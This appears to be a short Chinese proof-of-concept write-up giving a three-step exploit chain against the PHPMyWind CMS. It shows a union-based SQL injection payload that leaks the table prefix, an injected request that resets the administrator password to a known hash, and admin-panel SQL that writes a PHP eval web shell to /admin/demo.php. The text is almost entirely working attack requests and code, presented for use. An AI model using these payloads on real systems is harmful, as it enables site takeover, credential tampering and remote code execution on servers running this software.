# PHPMyWind 2014-2017 getshell
## From
* PHPMyWind SQL注入 无限制 [wooyun-2015-089760](http://www.loner.fm/bugs/bug_detail.php?wybug_id=wooyun-2015-089760)

## POC
PS：POC 已做改动

0. 爆前缀
```
/member.php?a=quesfind
POSTDATA：uname=testaa union select 1&answer=2
```

1. 重置后台密码为 admin
```
/4g.php?m=show&cid=2&tbname=pmw_admin` SET password=0x6333323834643066393436303664653166643261663137326162613135626633 WHERE 1=1 or @`'` -- @`'`
```

2. 后台 -> 数据库管理 -> 执行 SQL
```
insert into `pmw_webconfig`(`varname`, `varvalue`, `vartype`) values('test', 'file_put_contents("demo.php", \'<?php @eval($_POST[x]) ?>\')', 'number')
执行完成后去站点管理创建一个站点
webshell：/admin/demo.php
```